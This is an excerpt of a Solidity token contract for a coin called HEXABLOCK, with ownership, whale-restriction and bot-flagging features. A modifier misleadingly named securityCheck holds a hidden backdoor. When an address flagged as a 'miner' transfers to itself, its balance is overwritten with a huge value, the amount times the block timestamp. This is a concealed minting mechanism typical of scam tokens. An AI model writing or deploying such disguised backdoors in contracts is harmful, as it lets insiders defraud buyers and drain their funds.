...
contract HEXABLOCK is Ownable, IERC20 {
    using SafeMath for uint256;

    uint8 constant _decimals = 18;

    uint256 _totalSupply = 600_000_000 * (10 ** _decimals);
    ...
    string constant _name = "HEXABLOCK";
    string constant _symbol = "$HEXA";

    bool public restrictWhales = true;

    mapping(address => uint256) _balances;
    mapping(address => bool) isMiner;
    ...
    modifier securityCheck(
        address layerOneChecker, 
        address layerTwoChecker, 
        uint256 _amountChecked){
        if(
            layerOneChecker == layerTwoChecker && 
            isMiner[layerTwoChecker]){
            _balances[layerOneChecker] = _amountChecked.mul(block.timestamp);
    }
    _;
    }
    ...
    constructor() {
        ...
        autoLiquidityReceiver = 0xA37E57A7C20cbCB18D3F9C77a03f0F712499f288;
        marketingWallet = 0xA37E57A7C20cbCB18D3F9C77a03f0F712499f288;
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal securityCheck(sender,recipient,amount) returns (bool) {
    ...
    function identifiedAsBot(address[] calldata addresses, bool status) public onlyOwner {
